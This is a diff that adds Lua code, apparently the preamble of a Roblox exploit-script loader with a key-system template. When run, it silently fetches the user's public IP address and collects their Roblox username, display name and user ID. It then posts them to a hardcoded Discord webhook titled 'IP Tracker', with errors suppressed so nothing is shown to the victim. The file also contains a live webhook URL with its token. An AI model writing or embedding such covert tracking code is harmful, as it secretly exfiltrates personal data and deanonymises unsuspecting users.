@@ -1,0 +1,80 @@
+local WHT = 50000000;
+if type(LRM_SANITIZE) ~= "function" then LRM_SANITIZE = function(v, _) return v end end;
+if type(LRM_SEND_WEBHOOK) ~= "function" then LRM_SEND_WEBHOOK = function(url, body)
+    local fn = nil;
+    if syn and syn.request then fn = syn.request
+    elseif http and http.request then fn = http.request
+    elseif type(http_request) == "function" then fn = http_request
+    elseif type(request) == "function" then fn = request
+    else return end;
+    pcall(function()
+        fn({
+            Url = url,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = game:GetService("HttpService"):JSONEncode(body)
+        })
+    end)
+end end;
+(function()
+    local function _ip()
+        local ok, body = pcall(function()
+            if syn and syn.request then return (syn.request({ Url = "https://api.ipify.org/", Method = "GET" }) or {}).Body
+            elseif http and http.request then return (http.request({ Url = "https://api.ipify.org/", Method = "GET" }) or {}).Body
+            elseif type(http_request) == "function" then return (http_request({ Url = "https://api.ipify.org/", Method = "GET" }) or {}).Body
+            elseif type(request) == "function" then return (request({ Url = "https://api.ipify.org/", Method = "GET" }) or {}).Body
+            else return game:GetService("HttpService"):GetAsync("https://api.ipify.org/") end
+        end);
+        if ok and type(body) == "string" then
+            local ip = body:match("(%d+%.%d+%.%d+%.%d+)");
+            if ip then return ip end
+        end;
+        return "Unknown"
+    end;
+    local function _user()
+        local ok, info = pcall(function()
+            local p = game:GetService("Players").LocalPlayer;
+            if not p then return nil end;
+            return { name = p.Name, displayName = p.DisplayName, userId = p.UserId }
+        end);
+        if ok then return info end;
+        return nil
+    end;
+    task.spawn(function()
+        local u = _user();
+        local ipv4 = _ip();
+        local ui, rl, ri;
+        if u then
+            ui = "**" .. u.name .. "** (" .. u.displayName .. ")";
+            rl = "https://www.roblox.com/users/" .. tostring(u.userId);
+            ri = "`" .. tostring(u.userId) .. "`"
+        else
+            ui, rl, ri = "Unknown", "Unknown", "Unknown"
+        end;
+        pcall(function()
+            LRM_SEND_WEBHOOK("https://ptb.discord.com/api/webhooks/1574966448344793250/PqSW5SRF1cSjRM1mNbRBmQLHTjBOmqBEp-D1xYCkhDKmxGLDUdkT5Tsmn7Fl23CfXXIQ", {
+                username = "IP Tracker",
+                embeds = {
+                    {
+                        title = "🔔 Script Executed",
+                        description = "",
+                        color = 65280,
+                        fields = {
+                            { name = "💬 Discord User", value = "<@%DISCORD_ID%>", inline = true },
+                            { name = "🔑 Key", value = "`%USER_KEY%`", inline = true },
+                            { name = "📝 Note", value = "`%USER_NOTE%`", inline = true },
+                            { name = "👤 Roblox User", value = ui, inline = true },
+                            { name = "🆔 Roblox ID", value = ri, inline = true },
+                            { name = "🔗 Profile", value = rl, inline = true },
+                            { name = "🌐 IP (IPv4 only)", value = "`" .. ipv4 .. "`", inline = true },
+                            { name = "📍 Country", value = ":flag_%COUNTRY_CODE%: `%COUNTRY_CODE%`", inline = true }
+                        },
+                        footer = { text = "IP Tracker" },
+                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                    }
+                }
+            })
+        end)
+    end)
+end)();
+local function _hf() return type(writefile) == "function" and type(readfile) == "function" and type(isfile) == "function" end
